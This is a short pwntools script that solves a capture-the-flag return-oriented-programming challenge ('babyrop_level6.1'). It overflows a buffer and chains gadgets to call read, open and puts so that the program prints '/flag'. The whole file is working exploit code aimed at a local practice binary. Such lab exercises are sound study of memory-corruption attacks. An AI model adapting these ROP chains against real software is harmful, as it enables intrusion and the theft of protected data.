from pwn import *

puts= 0x4010b0
read_1 = 0x4010d0
open = 0x401100
pop_rdi = 0x402147
pop_rsi = 0x40213f
pop_rdx = 0x402137
buffer = 0x405500
r = process('/challenge/babyrop_level6.1')

 
payload = b'/'.ljust(0x78,b'\x00')
payload += p64(pop_rdi) + p64(0)+ p64(pop_rsi) + p64(buffer) + p64(pop_rdx) + p64(0x10) + p64(read_1) ## write /flag to buffer
payload += p64(pop_rdi) + p64(buffer)+ p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(open) ## open 
payload += p64(pop_rdi) + p64(3)+ p64(pop_rsi) + p64(buffer) + p64(pop_rdx) + p64(80) + p64(read_1) ## read /flag 
payload += p64(pop_rdi) + p64(buffer) + p64(puts)
r.send(payload+ b'\x00'*0x30)
r.send(b'/flag')

r.interactive()